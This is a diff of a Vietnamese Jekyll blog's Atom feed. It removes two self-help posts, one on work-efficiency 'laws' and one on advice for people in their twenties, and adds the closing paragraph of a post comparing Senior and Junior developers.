-&lt;p&gt;Ai cũng muốn một cuộc sống bình yên biển lặng nhưng thực tế thì sóng to gió lớn, bão tố ầm ầm.&lt;br /&gt;
-Điều đáng sợ nhất không phải là những biến cố bất ngờ, mà là khi những biến cố bất ngờ xảy đến, đến đường lui cũng không có mà lựa chọn.&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;Thêm cho mình một phần sao lưu là đang cho cuộc sống thêm một khả năng.&lt;/em&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;2-định-luật-dao-cạo&quot;&gt;2) Định luật dao cạo.&lt;/h3&gt;
-&lt;p&gt;Cắt đi một phần phức tạp, câu chuyện bỗng dưng đơn giản hơn nhiều.&lt;br /&gt;
-Bạn có biết trong một tuần, khoảng thời gian làm việc hiệu quả là bao nhiêu lâu?&lt;/p&gt;
-
-&lt;p&gt;Giả sử trung bình một người làm việc từ 40 - 45 tiếng, nhưng có 17 tiếng là làm việc không hiệu quả.&lt;/p&gt;
-
-&lt;p&gt;Nhiều người cứ nghĩ rằng “nhiều” là tốt, nhưng việc muốn làm càng nhiều thì việc hoàn thành lại càng ít.&lt;br /&gt;
-Vì vậy, mặc dù mỗi ngày đều làm việc kiệt sức nhưng thành quả chẵng được bao nhiêu.&lt;/p&gt;
-
-&lt;p&gt;Muốn thay đổi hiện trạng này, trước tiên hãy học cách đơn giản hoá công việc của bản thân.&lt;/p&gt;
-
-&lt;h3 id=&quot;3-định-luật-walson&quot;&gt;3) Định luật Walson.&lt;/h3&gt;
-&lt;p&gt;Chúng ta luôn nỗ lực để nâng cao năng lực chuyên nghành mà bỏ qua một thứ cũng rất quan trọng đó là &lt;strong&gt;thông tin&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;p&gt;Nhiều người tài giỏi hơn bạn, không phải vì năng lực họ hơn bạn mà bời vì họ nhanh nhạy hơn bạn, tức thời hơn bạn.&lt;/p&gt;
-
-&lt;p&gt;Muốn nắm bắt được cơ hội, trước tiên hãy học cách phát hiện cơ hội.&lt;br /&gt;
-Nắm bắt thông tin nhanh nhạy hơn người khác đồng thời ra tay hành động trước, người như vậy không thành công cũng khó.&lt;/p&gt;
-
-&lt;h3 id=&quot;4-định-luật-quả-táo&quot;&gt;4) Định luật quả táo.&lt;/h3&gt;
-&lt;p&gt;Nếu có một rổ táo, có quả tươi có quả hỏng, bạn ăn quả nào trước?&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Hãy ăn quả tươi trước, quả hỏng vức đi.&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Có lẽ bạn còn tiếc nên ăn quả hỏng trước, nhưng quả tươi lại dần dần cũng sẽ hỏng, bạn không thể cảm nhận được vị ngon ngọt của quả táo khi nó còn tươi.&lt;/p&gt;
-
-&lt;p&gt;“Định luật quả táo” cũng được áp dụng trong công việc.&lt;/p&gt;
-
-&lt;p&gt;Thực ra làm chuyện nào trước so với việc &lt;strong&gt;&lt;em&gt;làm được bao nhiêu chuyện&lt;/em&gt;&lt;/strong&gt; quan trọng hơn nhiều.&lt;/p&gt;
-
-&lt;p&gt;Nếu bạn có hàng tá công việc cần phải làm, tốt nhất bạn nên xem xét liệt kê ra thành một danh sách. Sau đó ưu tiên việc quan trọng làm trước tiên.&lt;/p&gt;
-
-&lt;h3 id=&quot;5-hội-chứng-con-đà-điểu-đừng-nên-viện-cớ&quot;&gt;5) Hội chứng con đà điểu: Đừng nên viện cớ&lt;/h3&gt;
-&lt;p&gt;Hôi chứng con đà điểu là một hội chứng tâm lý, xuất phát tượng hình từ hiện tượng nghe nói và quan sát được từ loài chim này. Bản năng tự vệ của loài chim này là chạy trốn nguy hiểm, khi không trốn được nữa nó sẽ rúc đầu vào cát và giả vờ như mình không thấy gì hết.&lt;/p&gt;
-
-&lt;p&gt;Nhưng, không viện cớ chính là bước đầu của việc sửa sai.&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;Không hứng thú, làm rồi cũng chẵng được gì, không hiểu lắm…&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;Khi gặp chuyện là tìm lý do thoái thác, đây là một điều khá tồi tệ của mọi người.&lt;/p&gt;
-
-&lt;h4 id=&quot;có-một-câu-chuyện-như-sau-1&quot;&gt;Có một câu chuyện như sau:&lt;/h4&gt;
-&lt;p&gt;&lt;strong&gt;Có người hỏi bác nông dân:&lt;/strong&gt; -Bác trồng lúa mì chưa?&lt;br /&gt;
-&lt;strong&gt;Bác nông dân trả lời:&lt;/strong&gt; -Chưa, tôi sợ trời mưa!&lt;br /&gt;
-&lt;strong&gt;Người đó tiếp tục hỏi:&lt;/strong&gt; -Vậy bac trồng bông chưa?&lt;br /&gt;
-&lt;strong&gt;Bác nông dân đáp:&lt;/strong&gt; -Cũng chưa, tôi sợ sâu bọ ăn bông!&lt;br /&gt;
-&lt;strong&gt;Người đó tại hỏi tiếp:&lt;/strong&gt; -Vậy rốt cuộc bác trồng cái gì?&lt;br /&gt;
-&lt;strong&gt;Bác nông dân đáp:&lt;/strong&gt; -Tôi chẵng trồng cái gì, như vậy là an toàn nhất.&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;&lt;strong&gt;Tâm lý học xã hội lý giải rằng&lt;/strong&gt; con người luôn muốn hợp thức hoá hành vi của mình, họ tìm mọi lời giải thích cho sự đùn đẩy trách nhiệm của bản thân để có thể được bảo vệ, được tự tôn hoặc ít nhất cũng an ủi đỡ phải khiến bản thân suy nghĩ nhiều, đây là một cơ chế bảo vệ tâm lý.&lt;/p&gt;
-
-&lt;p&gt;Người dũng cảm lắm mới thực sự tiến bộ, người đùn đẩy mãi mãi chỉ có thể dậm chân tại chỗ.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Bạn hãy đối mặt với vấn đề, tìm nguyên nhân từ bên ngoài hay tìm nguyên nhân từ chính bản thân mình.&lt;/strong&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;6-phản-lý-thuyết-thùng-rượu-tính-không-thể-thay-thế&quot;&gt;6) Phản lý thuyết thùng rượu: Tính không thể thay thế.&lt;/h3&gt;
-&lt;p&gt;Nâng cao tính không thể thay thế của bản thân.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Lý thuyết thùng rượu nói rằng:&lt;/strong&gt; thùng rượu có thể chứa được bao nhiêu rượu không quyết định bởi thanh gỗ dài nhất mà quyết định bởi thanh gỗ ngắn nhất. Khuyết điểm sẽ quyết định độ cao của bạn.&lt;/p&gt;
-
-&lt;p&gt;Trong xã hội ngày nay, sự phân chia lao động hiện đại so với sở đoản thì có thể nổi bật chính là sở trường của bạn.&lt;/p&gt;
-
-&lt;p&gt;“&lt;em&gt;Chuyên tâm vào sở trường của bạn, đặt bản thân vào nơi mà bạn có thể phát huy được sở trường của mình. Đừng lãng phí thời gian vào lĩnh vực mà mình không thể chiến thắng, vì từ &lt;code class=&quot;highlighter-rouge&quot;&gt;vô dụng&lt;/code&gt; tới &lt;code class=&quot;highlighter-rouge&quot;&gt;tạm được&lt;/code&gt; so với &lt;code class=&quot;highlighter-rouge&quot;&gt;tạm được&lt;/code&gt; tới &lt;code class=&quot;highlighter-rouge&quot;&gt;xuất sắc&lt;/code&gt;, con người cần phải bỏ ra nhiều nỗ lực hơn.&lt;/em&gt;”&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;&lt;small&gt;Nguồn: Internet&lt;/small&gt;&lt;/p&gt;</content><author><name>Trần Đức Lĩnh</name></author><category term="[&quot;news&quot;, &quot;other&quot;]" /><summary type="html">Hãy nắm vững những phương pháp làm việc hiệu quả so với việc bạn cứ cắm đầu vào và làm việc như một cái máy.</summary></entry><entry><title type="html">Tư duy và suy nghĩ ở tuổi đôi mươi</title><link href="http://localhost:4000/tu-duy-va-suy-nghi-o-tuoi-doi-muoi" rel="alternate" type="text/html" title="Tư duy và suy nghĩ ở tuổi đôi mươi" /><published>2020-04-16T00:00:00+07:00</published><updated>2020-04-16T00:00:00+07:00</updated><id>http://localhost:4000/tu-duy-va-suy-nghi-o-tuoi-doi-muoi</id><content type="html" xml:base="http://localhost:4000/tu-duy-va-suy-nghi-o-tuoi-doi-muoi">&lt;p&gt;Những ngày cuối cùng của năm &lt;strong&gt;2019&lt;/strong&gt;, những gì bản thân đang và đã làm trong một năm qua. Một chút suy tư, một chút hoài niệm.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/image/tu-duy-va-suy-nghi-o-tuoi-doi-muoi.jpg&quot; alt=&quot;image-title-here&quot; width=&quot;100%&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Sự trưởng thành được biểu đạt thông qua giao tiếp, cư xử, thái độ, trách nhiệm. Chứ không phải tuổi tác!&lt;br /&gt;
-Buồn bã, cô đơn và thất vọng. Đó là một phần của cuộc sống và hiển nhiên sẽ diễn ra, bản thân phải đối mặt và vượt qua nó. Tự lập về cảm xúc và trí tuệ là một khía cạnh của sự trưởng thành.&lt;/p&gt;
-
-&lt;h3 id=&quot;1-viết-chúng-ra-giấy&quot;&gt;1) Viết chúng ra giấy.&lt;/h3&gt;
-&lt;p&gt;Hãy tự thưởng cho bản thân một quyển ghi chú và ghi lại mục tiêu và mơ ước của bản thân, dán chúng ở bất kỳ đâu, miễn chúng có thể đập vào mắt mỗi ngày. Những mục tiêu nhỏ thôi, hoàn thành chúng trước tiên.&lt;/p&gt;
-
-&lt;p&gt;Khi đã tạo cho bản thân một thói quen, từ đó cũng là lúc nhận ra bản thân đã thay đổi từng ngày. Điều quan trọng nhất là mỗi sáng thức dậy không bị mất phương hướng. Thất bại nhất của bản thân không phải không có tiền trong tay, mà mỗi khi thức dậy không biết bản thân phải làm những gì.&lt;/p&gt;
-
-&lt;h3 id=&quot;2-luôn-trong-trạng-thái-học-tập-liên-tục&quot;&gt;2) Luôn trong trạng thái học tập liên tục.&lt;/h3&gt;
-&lt;p&gt;Giáo dục không bắt đầu và kết thúc trong lớp học.&lt;/p&gt;
-
-&lt;p&gt;Đó là một phần không thể thiếu của một thực thể có ý thức. Làm cho quá trình tiềm thức trở thành một ý thức, hiểu sâu hơn về cách thế giới xung quanh bản thân đang hoạt động, tiếp thu các kỹ năng bất kỳ đâu và bất cứ nơi nào mà bản thân có thể coi những người mà bản thân gặp trong cuộc sống như một người thầy cho dù đó là một con người tồi tệ nhất.&lt;/p&gt;
-
-&lt;p&gt;Hãy đa dạng sở trường và lĩnh vực khác trong cuộc sống. Sơ yếu lý lịch càng đa dạng sẽ hấp dẫn hơn trong mắt nhà tuyển dụng và những cô gái dễ thương ^^.&lt;/p&gt;
-
-&lt;h3 id=&quot;3-tiết-kiệm-tiền-và-chi-tiêu-1-cách-khôn-ngoan&quot;&gt;3) Tiết kiệm tiền và chi tiêu 1 cách khôn ngoan.&lt;/h3&gt;
-&lt;p&gt;Điều này đúng hoàn toàn. Tiền bạc tỉ lệ thuận với hạnh phúc theo đúng nghĩa kiếm được và tiết kiệm một cách khôn ngoan.&lt;br /&gt;
-Tiền vẫn nằm đó, nó cho phép bản thân có được cuộc sống không nghĩ ngợi nhiều và chăm sóc được người yêu sau này trong cuộc sống. Làm việc chăm chỉ và cần mẫn là điều không thể tránh khỏi.&lt;/p&gt;
-
-&lt;h3 id=&quot;4-chủ-động-tán-tỉnh&quot;&gt;4) Chủ động tán tỉnh.&lt;/h3&gt;
-&lt;p&gt;Bước ra đường đi, nhanh lên nào anh bạn! Mạnh dạng làm quen và tán tỉnh những cô gái mà bản thân thích ở bất cứ đâu, trên phố đi bộ hoặc trong quán cafe nào đó. Hãy sẵn sàng nói chuyện, và tích cực lắng nghe họ, đưa họ đi bất cứ nơi nào mà cả hai không cảm thấy nhàm chán.&lt;/p&gt;
-
-&lt;p&gt;Đừng đặt nặng vấn đề việc hai con người yêu nhau là phải có cái kết đẹp như một cái đám cưới hay sống chung tới tóc trắng răng rụng. Tình yêu tuyệt vời với rất nhiều cung bật cảm xúc, tuổi đang yêu và đang bắt đầu yêu, hãy yêu hết mình và &lt;em&gt;đừng để bị cảm cúm khi trời đổ mưa&lt;/em&gt;.&lt;/p&gt;
-
-&lt;h3 id=&quot;5-không-ngừng-khám-phá&quot;&gt;5) Không ngừng khám phá.&lt;/h3&gt;
-&lt;p&gt;Những trải nghiệm thực tế. Hãy lên lịch với những dự định đó, có tiền thì đi những nơi chưa đặt chân đến bao gồm lên rừng xuống biển, hạn hẹp chút xíu về tài chính có thể chuẩn bị xe máy và mang theo chút đồ ăn đến một nơi gần nơi đang sống và trải nghiệm nó.&lt;/p&gt;
-
-&lt;h3 id=&quot;6-tôn-trọng-giá-trị-bản-thân&quot;&gt;6) Tôn trọng giá trị bản thân.&lt;/h3&gt;
-&lt;p&gt;Điều này đồng nghĩa với việc bản thân không nên đánh đổi niềm tự hào của bản thân lấy những vật ngoài thân. Ví dụ vài tình huống như việc một thằng ất ơ cho bản thân &lt;strong&gt;500k&lt;/strong&gt; và chui qua háng nó. Hay phải hạ thấp bản thân xuống để quen một con dở hơi trên mạng xã hội nào đó mà chưa chắc đã &lt;em&gt;dầm mưa&lt;/em&gt; * với con bé đó hay không.&lt;/p&gt;
-
-&lt;h3 id=&quot;7-chơi-với-những-người-thành-công&quot;&gt;7) Chơi với những người thành công.&lt;/h3&gt;
-&lt;p&gt;Con người là động vật nhóm, giá trị của bản thân là trung bình cộng từ những người bạn thân chơi với chính bản thân và đem đi chia cho tổng số người đó. Muốn tăng giá trị bản thân hay giao lưu với những người có tư tưởng tích cực, giỏi giang và thành đạt.&lt;/p&gt;
-
-&lt;h3 id=&quot;8-đừng-quên-gia-đình&quot;&gt;8) Đừng quên gia đình.&lt;/h3&gt;
-&lt;p&gt;Hãy nhớ dành thời gian cho gia đình. Chúng là nguồn động lực khi bạn còn trẻ, cố gắn phấn đấu kiếm tiền cho ba mẹ đỡ vất vả, hãy về ăn cơm với gia đình khi cảm thấy bế tắc.&lt;/p&gt;</content><author><name>Trần Đức Lĩnh</name></author><category term="[&quot;new&quot;, &quot;other&quot;]" /><summary type="html">Những ngày cuối cùng của năm **2019**, những gì bản thân đang và đã làm trong một năm qua.</summary></entry></feed>
+&lt;p&gt;Như vậy, Senior và Junior có sự khác biệt về kinh nghiệm cũng như trong trình độ và chuyên môn. Có một điểm giống giữa Senior và Junior đó là phải luôn luôn học hỏi tìm tòi cái mới, trau dồi kiến thức mỗi ngày. Trong môi trường khắc nghiệt như hiện nay, dù bạn có là Senior, nếu không chịu cập nhật kiên thức, giữ khư khư cái cũ, bạn sẽ nhanh chóng lỗi thời và bị đào thải. Do vậy, Senior nên giữ mindset của một junor luôn học hỏi cố gắng hoàn thiện bản thân, tiếp thu những điều mới lạ ở môi trường làm việc xung quanh.&lt;/p&gt;</content><author><name>Pandora</name></author><category term="[&quot;other&quot;, &quot;news&quot;]" /><summary type="html">Junior, Senior là các thuật ngữ dùng để phân chia trình độ giữa những người làm trong một công ty, trong một ngành hay trong một lĩnh vực nào đó.</summary></entry></feed>
